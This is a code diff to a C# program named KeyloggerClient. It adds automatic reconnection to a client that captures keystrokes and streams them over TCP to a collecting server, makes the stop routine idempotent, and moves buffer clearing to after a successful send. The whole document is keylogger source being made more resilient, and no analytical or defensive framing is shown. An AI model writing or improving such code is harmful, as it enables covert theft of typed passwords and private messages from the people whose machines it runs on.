@@ -41,31 +41,50 @@ namespace KeyloggerClient
         /// <returns>A Task representing the asynchronous operation.</returns>
         public async Task StartAsync(CancellationToken cancellationToken = default, string host = "127.0.0.1", int port = 5000)
         {
-            try
+            while (!cancellationToken.IsCancellationRequested)
             {
-                client = new TcpClient(host, port);
-                stream = client.GetStream();
-
-                // Sends a handshake message to identify this as a client.
-                byte[] handshake = Encoding.UTF8.GetBytes("client");
-                await stream.WriteAsync(handshake, 0, handshake.Length);
-
-                cts = new CancellationTokenSource();
-
-                Console.WriteLine("Client: running");
-
-                var captureTask = Task.Run(() => CaptureKeysLoop(cts.Token), cancellationToken);
-
-                _running = true;
-                // Wait for either cancellation or manual stop
-                while (_running && !cancellationToken.IsCancellationRequested)
+                try
                 {
-                    await Task.Delay(1000, cancellationToken);
+                    client = new TcpClient(host, port);
+                    stream = client.GetStream();
+
+                    // Sends a handshake message to identify this as a client.
+                    byte[] handshake = Encoding.UTF8.GetBytes("client");
+                    await stream.WriteAsync(handshake, 0, handshake.Length);
+
+                    cts = new CancellationTokenSource();
+
+                    Console.WriteLine("Client: running");
+
+                    var captureTask = Task.Run(() => CaptureKeysLoop(cts.Token), cancellationToken);
+
+                    _running = true;
+
+                    // Wait until capture task exits or cancellation is requested
+                    while (_running && !cancellationToken.IsCancellationRequested && !captureTask.IsCompleted)
+                    {
+                        await Task.Delay(1000, cancellationToken);
+                    }
+
+                    if (captureTask.IsFaulted)
+                    {
+                        Console.WriteLine("Capture loop failed. Reconnecting...");
+                        throw captureTask.Exception?.InnerException ?? new KeyloggerException("Capture loop failed.");
+                    }
                 }
-            }
-            catch (Exception ex)
-            {
-                throw new KeyloggerException("Failed to start keylogger client.", ex);
+                catch (Exception ex)
+                {
+                    var kex = new KeyloggerException("Error occured while trying to connect to server", ex);
+                    Console.WriteLine(kex);
+                }
+                finally
+                {
+                    Stop();
+                }
+
+                // Reconnect logic
+                Console.WriteLine("Attempting to reconnect in 3 seconds...");
+                await Task.Delay(3000, cancellationToken);
             }
         }
 
@@ -74,10 +93,14 @@ namespace KeyloggerClient
         /// </summary>
         public void Stop()
         {
+            if (!_running) return;
+
             _running = false;
             cts?.Cancel();
             stream?.Close();
             client?.Close();
+
+            Console.WriteLine("Client stopped.");
         }
 
         /// <summary>
@@ -145,14 +168,16 @@ namespace KeyloggerClient
                 try
                 {
                     await stream.WriteAsync(data, 0, data.Length);
+                    keyBuffer.Clear();
+                    lastSend = DateTime.Now;
                 }
                 catch (Exception ex)
                 {
-                    throw new KeyloggerException("Failed to send data to the server.", ex);
+                    var kex = new KeyloggerException("Connection lost to server", ex);
+                    Console.WriteLine(kex);
+                    throw; // Let the outer loop handle reconnect
                 }
 
-                keyBuffer.Clear();
-                lastSend = DateTime.Now;
             }
         }
 
